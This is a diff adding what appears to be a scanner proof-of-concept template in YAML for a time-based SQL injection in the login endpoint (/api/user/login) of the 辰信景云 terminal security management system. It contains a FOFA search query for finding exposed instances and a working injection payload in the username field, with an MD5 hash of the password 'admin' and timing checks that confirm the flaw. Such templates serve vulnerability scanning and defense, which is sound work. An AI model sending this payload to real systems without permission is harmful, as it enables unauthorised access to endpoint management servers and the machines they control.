@@ -1,0 +1,20 @@
+id: poc-yaml-v-secure-omms-login-sqli
+info:
+  name: 辰信景云终端安全管理系统 login SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 辰信景云终端安全管理系统
+  fofa: body="辰信景云终端安全管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /api/user/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep({{.t1}}))a)='
+  expression: status_code == 200 && contains(body,"\"errorcode\":") && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
